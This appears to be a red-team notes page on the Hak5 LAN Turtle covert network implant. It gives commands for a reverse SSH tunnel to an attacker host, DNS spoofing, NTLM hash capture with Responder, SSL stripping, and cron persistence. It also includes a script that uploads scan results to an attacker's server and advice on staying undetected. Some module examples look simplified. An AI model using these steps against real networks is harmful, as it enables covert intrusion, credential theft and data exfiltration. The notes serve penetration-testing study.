- [[Implants and Remote Access]]
	- [[Hak5 Key Croc]]
	- [[Hak5 LAN Turtle]]
	- [[Hak5 Packet Squirrel]]
	- [[Hak5 Screen Crab]]

The Hak5 LAN Turtle is a covert penetration testing tool disguised as a USB Ethernet adapter. It provides remote access, network recon, and man-in-the-middle (MITM) capabilities. It’s commonly used for network-based attacks, reconnaissance, and persistence within internal networks during red teaming engagements. 

The LAN Turtle runs a Linux-based operating system and has several pre-installed modules for automation and exploitation. It can be controlled via a local interface (SSH) or remotely through a reverse shell.

# Setup and Usage

#### Hardware Setup
1. Acquire the Device: Purchase the Hak5 LAN Turtle from the Hak5 store.
2. Connect the Device: Insert the LAN Turtle into a USB port with a network cable attached to it. The device can act as an Ethernet passthrough, so you can plug it into any network connection while keeping your target device online.
3. Access the LAN Turtle:
   - Default credentials:
     - Username: `root`
     - Password: `sh3llz`
   - You can SSH into the LAN Turtle after it has acquired an IP address:
     ```bash
     ssh root@<turtle_ip>
     ```
   - Alternatively, use a local serial terminal:
     ```bash
     screen /dev/ttyUSB0 115200
     ```

#### Network Configuration
1. Find the LAN Turtle IP: 
   The LAN Turtle gets its IP address via DHCP when connected to a network. Use the following commands to verify the network interface and check IP configuration:
   ```bash
   ifconfig
   ip addr show
   ```

2. Setting a Static IP:
   You can configure a static IP by editing the network configuration file.
   ```bash
   vi /etc/config/network
   ```

3. Internet Connection Sharing:
   If you need the LAN Turtle to share the Internet connection of the host device:
   - Ensure that the LAN Turtle is recognized as an Ethernet interface.
   - Configure IP forwarding on the host machine.

#### Remote Access
The LAN Turtle is often used for establishing a remote access foothold. One of its key features is the ability to automatically create a reverse shell to an external server for persistent access.

1. AutoSSH Module (Reverse Shell):
   - This module allows the LAN Turtle to create an SSH tunnel to a remote server, enabling remote access to the internal network from outside.
   - Configuring AutoSSH:
     ```bash
     turtle# autossh
     Enter remote host IP: <attack_ip>
     Enter remote host port: <attack_port>
     Enter remote host username: <username>
     Enter the local port to bind reverse shell to (optional): <local_port>
     ```
   - Example:
     ```bash
     autossh
     Enter remote host IP: 10.10.10.1
     Enter remote host port: 22
     Enter remote host username: root
     Enter the local port to bind reverse shell to (optional): 8080
     ```
   - This sets up a reverse SSH connection from the LAN Turtle to an external server.

2. VPN Pivot:
   The LAN Turtle can also be used as a VPN client to create an encrypted tunnel to a remote VPN server, allowing for pivoting into the internal network.
   - You can configure the VPN settings using OpenVPN, or the VPN Client module provided by the Turtle.
   - Example:
     ```bash
     turtle# vpnclient
     Enter VPN server IP: <vpn_server_ip>
     Enter VPN credentials: <username> / <password>
     ```

# LAN Turtle Modules

One of the most powerful aspects of the LAN Turtle is its modular framework. It comes with a variety of pre-installed modules that are designed for specific tasks like network reconnaissance, MITM, or remote access.

#### Basic Commands
```bash
turtle# ifconfig  # View network interfaces
turtle# ps        # View running processes
turtle# ls /mnt   # Access USB storage
```

#### Popular Modules
1. nmap:
   - The `nmap` module allows you to scan the local network.
   - Example usage:
     ```bash
     turtle# nmap -sP 192.168.1.0/24
     ```

2. DNS Spoof:
   - This module allows DNS spoofing attacks, where DNS queries are intercepted and altered to direct a victim to a malicious IP address.
   - Example usage:
     ```bash
     turtle# dnsspoof
     Enter target domain: example.com
     Enter spoofed IP address: <attack_ip>
     ```

3. Responder:
   - The `Responder` module listens for NetBIOS/LLMNR queries and responds with poisoned answers to capture network credentials (NTLM hashes).
   - Example usage:
     ```bash
     turtle# responder
     Starting responder on interface eth0...
     ```

4. Cronjobs:
   - You can schedule cron jobs to run specific tasks at regular intervals, which is useful for persistence or maintaining access.
   - Example cron job:
     ```bash
     turtle# crontab -e
     @reboot /path/to/malicious/script.sh
     ```

5. AutoSSH:
   - The `AutoSSH` module creates an outbound reverse shell to a remote server, enabling persistent remote access.
   - Example usage:
     ```bash
     turtle# autossh
     Enter remote host IP: <attack_ip>
     Enter remote host port: <attack_port>
     ```

6. Meterpreter:
   - The `Meterpreter` module can be used in conjunction with Metasploit to maintain remote access with a shell running in memory.
   - Example usage:
     ```bash
     turtle# meterpreter
     Starting Meterpreter reverse shell...
     ```

7. SSLstrip:
   - The `SSLstrip` module is used to perform SSL stripping attacks by downgrading HTTPS connections to HTTP, allowing an attacker to intercept unencrypted traffic.
   - Example usage:
     ```bash
     turtle# sslstrip
     Starting SSLstrip...
     ```

8. Packet Sniffer:
   - You can capture packets from the target network using a simple packet capture tool such as `tcpdump`.
   - Example usage:
     ```bash
     turtle# tcpdump -i eth0 -w capture.pcap
     ```

# Scripting with LAN Turtle

The LAN Turtle runs a Linux environment, which allows you to create custom scripts using languages such as Bash or Python.

#### Custom Bash Script Example
Below is a simple Bash script that runs network discovery and sends the results to a remote server.

```bash
#!/bin/bash

# Network Discovery
nmap -sP 192.168.1.0/24 > /tmp/nmap_scan.txt

# Upload the results to the attacker's server
scp /tmp/nmap_scan.txt user@<attack_ip>:/path/to/save/
```

1. Save this script as `scan_and_upload.sh`.
2. Transfer it to the LAN Turtle.
3. Add execution permissions:
   ```bash
   chmod +x scan_and_upload.sh
   ```
4. Run the script:
   ```bash
   ./scan_and_upload.sh
   ```

#### Custom Python Script Example
This Python script listens on the network for a specific keyword and executes a command when detected.

```python
import socket

# Setup the UDP listener
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(('0.0.0.0', 8080))

while True:
    data, addr = sock.recvfrom(1024)  # Buffer size is 1024 bytes
    if b"trigger" in data:
        print("Keyword detected! Running command...")
        # Insert any shell command or script here
```

1. Save this as `listener.py`.
2. Execute the script:
   ```bash
   python listener.py
   ```

# Best Practices

- Persistence: Use the AutoSSH or VPN pivot modules to maintain remote access after deployment.
- Stealth: Since the LAN Turtle is a network device, it can be deployed in a way that is unobtrusive and difficult to detect. Ensure proper naming of services to blend in with legitimate traffic.
- Recon Modules: Use modules like `nmap`, `Responder`, and `tcpdump` for network discovery and credential harvesting.
- Custom Scripting: Leverage Bash and Python scripting to automate tasks and create custom payloads tailored to the target environment.